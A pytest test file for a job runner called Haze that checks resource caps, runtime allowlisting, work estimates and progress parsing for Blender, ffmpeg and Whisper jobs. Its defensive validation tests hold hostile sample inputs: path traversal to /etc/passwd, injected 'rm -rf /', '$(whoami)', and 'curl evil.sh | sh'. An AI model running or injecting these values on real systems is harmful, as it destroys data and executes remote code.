"""Job admission, execution and the argument allowlist.

The security-relevant assertions here are the rejections: Haze runs a fixed set
of runtimes with validated arguments, and a peer must not be able to widen that
into arbitrary execution or reach outside its job directory.
"""

from __future__ import annotations

import asyncio
import os
import sys
from collections.abc import Callable
from pathlib import Path

import pytest

from haze.jobs import runtimes
from haze.jobs.executor import Caps, JobExecutor, new_job_id
from haze.jobs.progress import (
    BlenderProgressParser,
    FfmpegProgressParser,
    WhisperProgressParser,
)
from haze.jobs.spec import JobSpec, JobState, ResourceRequest


def _spec(runtime: str = "hashbench", **args: object) -> JobSpec:
    return JobSpec(
        job_id=new_job_id(),
        runtime=runtime,
        args=dict(args),
        resources=ResourceRequest(cpu_cores=1, ram_bytes=1 << 30, wall_seconds=60),
    )


async def _wait_until(predicate: Callable[[], bool], message: str, timeout_s: float = 30.0) -> None:
    """Poll until a condition holds. Jobs expose state rather than events, and
    the alternative -- adding a notification to production code so tests can
    await it -- would be the tail wagging the dog."""
    loop = asyncio.get_running_loop()
    deadline = loop.time() + timeout_s
    while not predicate():
        if loop.time() > deadline:
            raise AssertionError(message)
        await asyncio.sleep(0.05)


async def _finish(executor: JobExecutor, spec: JobSpec, timeout_s: float = 60.0):
    record = executor.submit(spec)
    await _wait_until(
        lambda: record.state.terminal, f"job did not finish: {record.state}", timeout_s
    )
    return record


# --- execution --------------------------------------------------------------

async def test_a_job_runs_and_reports_progress(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("HAZE_HOME", str(tmp_path))
    executor = JobExecutor()
    record = await _finish(executor, _spec(rounds=20))

    assert record.state is JobState.SUCCEEDED
    assert record.exit_code == 0
    assert record.progress.fraction == 1.0
    assert record.duration_s is not None and record.duration_s > 0
    await executor.shutdown()


async def test_the_final_throughput_survives_completion(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """Regression: _finish used to build a fresh Progress on success, which
    discarded the rate -- the one number a benchmark exists to produce."""
    monkeypatch.setenv("HAZE_HOME", str(tmp_path))
    executor = JobExecutor()
    record = await _finish(executor, _spec(rounds=30))
    assert record.progress.rate, "throughput was lost when the job completed"
    await executor.shutdown()


async def test_peak_memory_is_recorded_for_short_jobs(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """Regression: a job finishing inside the first poll interval reported 0."""
    monkeypatch.setenv("HAZE_HOME", str(tmp_path))
    executor = JobExecutor()
    record = await _finish(executor, _spec(rounds=5))
    assert record.peak_ram_bytes > 0
    await executor.shutdown()


async def test_a_job_can_be_cancelled(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("HAZE_HOME", str(tmp_path))
    executor = JobExecutor()
    record = executor.submit(_spec(rounds=100_000))

    # ASYNC110 suggests an Event; polling is deliberate here. The executor
    # exposes state, not a notification, and adding an Event to production code
    # purely so a test can wait on it would be the tail wagging the dog.
    await _wait_until(lambda: record.state is JobState.RUNNING, "job never started")
    assert await executor.cancel(record.spec.job_id)

    await _wait_until(lambda: record.state.terminal, "cancel did not stop the job")
    assert record.state is JobState.CANCELLED
    await executor.shutdown()


async def test_wall_clock_is_enforced_regardless_of_the_os(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    """The executor owns the timer. Unlike memory and CPU caps, this works the
    same everywhere because it needs no OS support."""
    monkeypatch.setenv("HAZE_HOME", str(tmp_path))
    executor = JobExecutor()
    spec = JobSpec(
        job_id=new_job_id(),
        runtime="hashbench",
        args={"rounds": 100_000},
        resources=ResourceRequest(cpu_cores=1, ram_bytes=1 << 30, wall_seconds=1),
    )
    record = await _finish(executor, spec, timeout_s=30)
    assert record.state is JobState.FAILED
    # Two mechanisms can stop it, and either is a pass: the executor's own
    # watchdog, or RLIMIT_CPU killing it with SIGXCPU first. What matters is
    # that the message names a limit rather than showing a raw signal number.
    assert "time limit" in record.error, record.error
    await executor.shutdown()


# --- admission --------------------------------------------------------------

def test_caps_reject_before_anything_runs() -> None:
    caps = Caps(max_cores=2, max_ram_bytes=1 << 30, max_wall_seconds=60)
    over_cores = JobSpec(job_id="x", runtime="hashbench", args={},
                         resources=ResourceRequest(cpu_cores=8, wall_seconds=30))
    reason = caps.reject_reason(over_cores)
    assert reason and "8 cores" in reason and "allows 2" in reason


def test_gpu_can_be_withheld() -> None:
    caps = Caps(max_cores=8, max_ram_bytes=1 << 34, max_wall_seconds=600, allow_gpu=False)
    spec = JobSpec(job_id="x", runtime="hashbench", args={},
                   resources=ResourceRequest(needs_gpu=True, wall_seconds=30))
    assert "does not share it" in (caps.reject_reason(spec) or "")


async def test_unknown_runtime_is_rejected_with_the_alternatives(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    monkeypatch.setenv("HAZE_HOME", str(tmp_path))
    executor = JobExecutor()
    record = await _finish(executor, _spec(runtime="rm -rf /"))
    assert record.state is JobState.REJECTED
    assert "unknown runtime" in record.error
    assert "hashbench" in record.error, "the refusal should name what IS allowed"
    await executor.shutdown()


async def test_bad_arguments_are_rejected_not_passed_through(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    monkeypatch.setenv("HAZE_HOME", str(tmp_path))
    executor = JobExecutor()
    for bad in ("lots", -1, 10**9, None):
        record = await _finish(executor, _spec(rounds=bad))
        assert record.state is JobState.REJECTED, f"rounds={bad!r} was accepted"
    await executor.shutdown()


# --- the allowlist ----------------------------------------------------------

@pytest.mark.parametrize(
    "candidate",
    [
        "../../../etc/passwd",
        "/etc/passwd",
        "..",
        "sub/../../../../etc/passwd",
        "  spaced.blend",
        "",
    ],
)
def test_paths_cannot_escape_the_job_directory(tmp_path: Path, candidate: str) -> None:
    with pytest.raises(runtimes.JobArgumentError):
        runtimes.safe_join(tmp_path, candidate)


def test_a_legitimate_path_inside_the_job_directory_is_allowed(tmp_path: Path) -> None:
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "scene.blend").write_text("x")
    assert runtimes.safe_join(tmp_path, "sub/scene.blend").is_file()


def test_ffmpeg_refuses_an_encoder_this_node_lacks(tmp_path: Path) -> None:
    if not runtimes.get("ffmpeg").available():
        pytest.skip("ffmpeg not installed")
    (tmp_path / "in.mp4").write_bytes(b"\x00")
    with pytest.raises(runtimes.JobArgumentError, match="not available here"):
        runtimes.get("ffmpeg").prepare(
            {"input": "in.mp4", "encoder": "definitely_not_an_encoder"}, tmp_path
        )


def test_blender_refuses_an_arbitrary_device_string(tmp_path: Path) -> None:
    (tmp_path / "s.blend").write_text("x")
    if not runtimes.get("blender").available():
        pytest.skip("blender not installed")
    with pytest.raises(runtimes.JobArgumentError, match="device"):
        runtimes.get("blender").prepare(
            {"blend_file": "s.blend", "device": "; rm -rf /"}, tmp_path
        )


# whisper validates its arguments *before* checking whether faster-whisper is
# installed, so every rejection below runs on a machine (and in CI) without the
# optional extra. That ordering is the reason these tests are worth anything:
# the alternative is a permanently-skipped test for the checks that matter most.

@pytest.mark.parametrize(
    ("args", "expected"),
    [
        # A model name reaches WhisperModel, which accepts a local path or a
        # Hugging Face repo id -- so an arbitrary string is an arbitrary read
        # and an arbitrary download.
        ({"model": "; rm -rf /"}, "model"),
        ({"model": "../../../etc/passwd"}, "model"),
        ({"device": "; rm -rf /"}, "device"),
        ({"device": "cuda; curl evil.sh | sh"}, "device"),
        ({"compute_type": "$(whoami)"}, "compute_type"),
        ({"format": "../../etc/passwd"}, "format"),
        ({"language": "en; rm -rf /"}, "language"),
        ({"beam_size": 0}, "beam_size"),
        ({"beam_size": 10**6}, "beam_size"),
        ({"beam_size": "five"}, "beam_size"),
        ({"beam_size": True}, "beam_size"),
        ({"vad_filter": "yes"}, "vad_filter"),
    ],
)
def test_whisper_refuses_arbitrary_argument_values(
    tmp_path: Path, args: dict[str, object], expected: str
) -> None:
    (tmp_path / "a.wav").write_bytes(b"\x00")
    with pytest.raises(runtimes.JobArgumentError, match=expected) as caught:
        runtimes.get("whisper").prepare({"audio": "a.wav", **args}, tmp_path)
    # Not "faster-whisper is not installed": that would mean the rejection came
    # from the availability check rather than from validating the value.
    assert "not installed" not in str(caught.value)


def test_whisper_audio_cannot_escape_the_job_directory(tmp_path: Path) -> None:
    with pytest.raises(runtimes.JobArgumentError, match="escapes the job directory"):
        runtimes.get("whisper").prepare({"audio": "../../../etc/passwd"}, tmp_path)


def test_whisper_names_the_models_it_will_accept(tmp_path: Path) -> None:
    """A refusal that does not say what IS allowed sends the peer guessing."""
    (tmp_path / "a.wav").write_bytes(b"\x00")
    with pytest.raises(runtimes.JobArgumentError, match="large-v3") as caught:
        runtimes.get("whisper").prepare({"audio": "a.wav", "model": "huge"}, tmp_path)
    assert "base" in str(caught.value)


def test_whisper_builds_a_python_argv_with_a_cached_model_home(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    if not runtimes.get("whisper").available():
        pytest.skip("faster-whisper not installed")
    monkeypatch.setenv("HAZE_HOME", str(tmp_path / "home"))
    (tmp_path / "talk.wav").write_bytes(b"\x00")

    prepared = runtimes.get("whisper").prepare(
        {"audio": "talk.wav", "model": "base", "format": "srt"}, tmp_path
    )

    # Invoked as a module, like hashbench: a library, not a binary, but still
    # through the normal subprocess path so the caps apply.
    assert prepared.argv[:3] == [sys.executable, "-m", "haze.jobs.runtimes.whisper"]
    assert prepared.explicit_outputs == [tmp_path / "out" / "talk.srt"]
    # Without a stable model home every job re-downloads gigabytes.
    assert prepared.env["HF_HOME"].startswith(str(tmp_path / "home"))


def test_whisper_only_allows_models_the_library_knows() -> None:
    """The allowlist is a literal, so that validating one argument does not cost
    seconds of importing faster-whisper inside the agent's event loop. This is
    what keeps the literal honest wherever the extra is actually installed."""
    if not runtimes.get("whisper").available():
        pytest.skip("faster-whisper not installed")
    from faster_whisper.utils import _MODELS as LIBRARY_MODELS

    from haze.jobs.runtimes.whisper import _MODELS

    assert _MODELS.issubset(LIBRARY_MODELS), "allowlist names a model the library cannot resolve"


def test_every_registered_runtime_declares_itself() -> None:
    assert set(runtimes.REGISTRY) == {"hashbench", "blender", "ffmpeg", "whisper"}
    for name, runtime in runtimes.REGISTRY.items():
        assert runtime.name == name
        assert runtime.description


# --- work estimates ---------------------------------------------------------
# What the scheduler is told a job costs, when the submitter does not say. The
# numbers themselves are stated constants rather than measurements (except
# hashbench's, which is the definition of the baseline) -- so what is worth
# testing is that each one moves with the argument that should move it, and
# that a runtime with nothing to go on says so instead of inventing a figure.

def test_hashbench_work_scales_with_rounds() -> None:
    hashbench = runtimes.REGISTRY["hashbench"]
    small = hashbench.estimate_work_units({"rounds": 100}, [])
    large = hashbench.estimate_work_units({"rounds": 1000}, [])
    assert large == pytest.approx(small * 10)


def test_hashbench_uses_its_documented_default_round_count() -> None:
    """The estimate and prepare() must agree about what "no rounds given"
    means, or a job is placed as one size and run as another."""
    from haze.jobs.runtimes.hashbench import SECONDS_PER_ROUND

    hashbench = runtimes.REGISTRY["hashbench"]
    assert hashbench.estimate_work_units({}, []) == pytest.approx(200 * SECONDS_PER_ROUND)


def test_blender_work_scales_with_the_frame_count() -> None:
    from haze.jobs.runtimes.blender import SECONDS_PER_FRAME

    blender = runtimes.REGISTRY["blender"]
    one = blender.estimate_work_units({"frame_start": 1, "frame_end": 1}, [])
    ten = blender.estimate_work_units({"frame_start": 5, "frame_end": 14}, [])
    assert one == pytest.approx(SECONDS_PER_FRAME)
    assert ten == pytest.approx(10 * SECONDS_PER_FRAME)


@pytest.mark.parametrize(
    "name,args",
    [
        ("hashbench", {"rounds": "lots"}),
        ("blender", {"frame_start": 10, "frame_end": 1}),
        ("ffmpeg", {"input": "nothing-was-sent.mov"}),
        ("whisper", {"audio": "nothing-was-sent.wav"}),
    ],
)
def test_an_unsizeable_job_falls_back_to_the_default(name: str, args: dict[str, object]) -> None:
    """Arguments prepare() will reject, or an input that is not being sent.

    Estimating is not the place to raise: the executor rejects a bad job a
    moment later with a message written for the submitter, and a guess is not
    worth crashing a placement over.
    """
    assert runtimes.REGISTRY[name].estimate_work_units(args, []) == runtimes.DEFAULT_WORK_UNITS


def test_media_runtimes_price_a_clip_by_its_duration(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Duration, not file size: bitrate varies by an order of magnitude between
    a phone clip and a ProRes master, so bytes are a poor proxy for compute."""
    from haze.jobs import media

    clip = tmp_path / "clip.mov"
    clip.write_bytes(b"not really a video")
    monkeypatch.setattr(media, "duration_seconds", lambda _p: 120.0)

    ffmpeg = runtimes.REGISTRY["ffmpeg"]
    software = ffmpeg.estimate_work_units({"input": "clip.mov", "encoder": "libx265"}, [clip])
    hardware = ffmpeg.estimate_work_units({"input": "clip.mov", "encoder": "h264_nvenc"}, [clip])
    assert software > hardware, "hardware encoding must look cheaper, or nothing prefers it"

    audio = tmp_path / "talk.wav"
    audio.write_bytes(b"not really audio")
    whisper = runtimes.REGISTRY["whisper"]
    tiny = whisper.estimate_work_units({"audio": "talk.wav", "model": "tiny"}, [audio])
    large = whisper.estimate_work_units({"audio": "talk.wav", "model": "large-v3"}, [audio])
    assert large > tiny


def test_whisper_reads_turbo_out_of_a_name_that_also_says_large() -> None:
    """`large-v3-turbo` is a turbo model. Matching in dictionary order would
    price it as a large one and ship a cheap job across the network."""
    from haze.jobs.runtimes.whisper import REALTIME_FACTORS, _realtime_factor

    assert _realtime_factor("large-v3-turbo") == REALTIME_FACTORS["turbo"]
    assert _realtime_factor("large-v3") == REALTIME_FACTORS["large"]
    assert _realtime_factor("distil-small.en") == REALTIME_FACTORS["small"]


def test_an_input_the_submitter_is_not_sending_is_not_stat_ed(tmp_path: Path) -> None:
    """The named file is matched against the files travelling with the job, not
    against whatever happens to sit at that path on this machine."""
    from haze.jobs import media

    assert media.duration_of_named("elsewhere.mov", []) is None
    assert media.duration_of_named(None, []) is None


# --- progress parsing -------------------------------------------------------

def test_ffmpeg_progress_uses_microseconds() -> None:
    """out_time_ms is microseconds despite the name. Reading it as
    milliseconds makes the bar finish 1000x early."""
    parser = FfmpegProgressParser(total_duration_s=100.0)
    for line in ("frame=50", "fps=25", "out_time_ms=50000000", "speed=2x", "progress=continue"):
        parser.feed(line)
    assert parser.progress.fraction == pytest.approx(0.5)


# Captured verbatim from `blender -b scene.blend -a` on Blender 5.1.2. Using
# real output is the point: an earlier version of this parser was written to
# the older documented format, passed its tests against that same invented
# input, and matched nothing a real Blender printed.
BLENDER_5X_OUTPUT = [
    '00:00.001  blend            | Read blend: "/tmp/scene.blend"',
    "00:00.100  render           | Rendering animation (frames 1..3)",
    "00:00.110  render           | Rendering frame 1",
    "00:00.300  render           | Fra: 1 | Rendering 8 / 16 samples",
    "00:00.687  render           | Saved: '/tmp/out/0001.png'",
    "00:00.687  render           | Time: 00:00.49 (Saving: 00:00.05)",
    "00:01.100  render           | Rendering frame 2",
    "00:01.253  render           | Saved: '/tmp/out/0002.png'",
    "00:01.253  render           | Time: 00:00.56 (Saving: 00:00.00)",
]


def test_blender_parses_the_modern_prefixed_format() -> None:
    parser = BlenderProgressParser(1, 3)
    for line in BLENDER_5X_OUTPUT:
        parser.feed(line)

    assert parser.saved_files == ["/tmp/out/0001.png", "/tmp/out/0002.png"]
    assert parser.progress.frames_done == 2
    assert parser.progress.frames_total == 3
    assert parser.progress.fraction == pytest.approx(2 / 3)
    assert parser.progress.rate.endswith("s/frame")
    assert parser.progress.eta_seconds is not None


def test_blender_counts_saved_frames_not_started_ones() -> None:
    """"Rendering frame N" announces a frame that has *started*; counting it
    would report 1/1 done the moment rendering began."""
    parser = BlenderProgressParser(1, 3)
    parser.feed("00:00.100  render           | Rendering animation (frames 1..3)")
    parser.feed("00:00.110  render           | Rendering frame 1")
    assert parser.progress.frames_done == 0

    parser.feed("00:00.687  render           | Saved: '/tmp/out/0001.png'")
    assert parser.progress.frames_done == 1


def test_blender_trusts_the_range_it_reports_over_the_one_requested() -> None:
    """A .blend can override the frame range, so Blender's own statement wins."""
    parser = BlenderProgressParser(1, 99)
    parser.feed("00:00.100  render           | Rendering animation (frames 1..3)")
    assert parser.progress.frames_total == 3


def test_blender_sample_progress_smooths_the_bar_within_a_frame() -> None:
    parser = BlenderProgressParser(1, 2)
    parser.feed("00:00.100  render           | Rendering animation (frames 1..2)")
    parser.feed("00:00.300  render           | Fra: 1 | Rendering 8 / 16 samples")
    # Half of the first of two frames.
    assert parser.progress.fraction == pytest.approx(0.25)


def test_blender_still_parses_the_legacy_flat_format() -> None:
    """Older Blender and Cycles emit an unprefixed line with Mem/Remaining."""
    parser = BlenderProgressParser(1, 4)
    parser.feed("Fra:1 Mem:10.00M (Peak 55.60M) | Time:00:01.00 | Remaining:00:03.00")
    assert parser.peak_mem_bytes == pytest.approx(55.60 * 1024**2, rel=0.01)
    assert parser.progress.eta_seconds is not None

    parser.feed("Saved: '/tmp/out/0001.png'")
    assert parser.progress.frames_done == 1
    assert parser.progress.fraction == pytest.approx(0.25)


def test_progress_admits_when_it_cannot_compute_a_fraction() -> None:
    """No duration means no percentage. A bar that guesses is worse than one
    that says it does not know."""
    parser = FfmpegProgressParser(total_duration_s=None)
    parser.feed("frame=10")
    parser.feed("out_time_ms=5000000")
    assert parser.progress.fraction is None
    assert parser.progress.frames_done == 10


def test_whisper_progress_is_a_fraction_of_audio_seconds() -> None:
    parser = WhisperProgressParser()
    parser.feed("duration 240.00")
    assert parser.progress.frames_total == 240

    parser.feed("processed 120.00s / 240.00s")
    assert parser.progress.fraction == pytest.approx(0.5)
    assert parser.progress.frames_done == 120
    assert parser.progress.rate.endswith("x realtime")
    assert parser.progress.eta_seconds is not None

    parser.feed("segment So the first thing to notice")
    assert "first thing" in parser.progress.detail

    parser.feed("done")
    assert parser.progress.fraction == 1.0


def test_whisper_ignores_the_librarys_own_chatter() -> None:
    """ctranslate2 and huggingface_hub both log to the same merged stream."""
    parser = WhisperProgressParser()
    for line in ("Processing audio with duration 00:04:00.000", "", "config.json: 100%|##|"):
        assert parser.feed(line) is False
    assert parser.progress.fraction is None


def test_whisper_admits_when_it_has_no_duration() -> None:
    """A zero duration means no honest percentage -- same rule as ffmpeg."""
    parser = WhisperProgressParser()
    parser.feed("duration 0.00")
    parser.feed("processed 12.00s / 0.00s")
    assert parser.progress.fraction is None
    assert parser.progress.frames_done == 12


async def test_a_job_runs_in_its_own_process_group(tmp_path, monkeypatch):
    """The executor signals the *group* to stop a job, because ffmpeg and
    Blender both spawn helpers that outlive a kill aimed at the parent.

    If a child ever shared the agent's group, that same killpg would take down
    the agent and the shell that launched it -- so this asserts the separation
    the whole teardown path depends on.
    """
    if not hasattr(os, "getpgid"):
        pytest.skip("POSIX process groups only")

    monkeypatch.setenv("HAZE_HOME", str(tmp_path))
    executor = JobExecutor()
    spec = _spec(rounds=4000)
    record = executor.submit(spec)
    await _wait_until(
        lambda: spec.job_id in executor._processes, "job never started"
    )

    process = executor._processes[spec.job_id]
    assert os.getpgid(process.pid) != os.getpgrp()

    await executor.cancel(spec.job_id)
    await _wait_until(lambda: record.state.terminal, "job did not stop")
    await executor.shutdown()
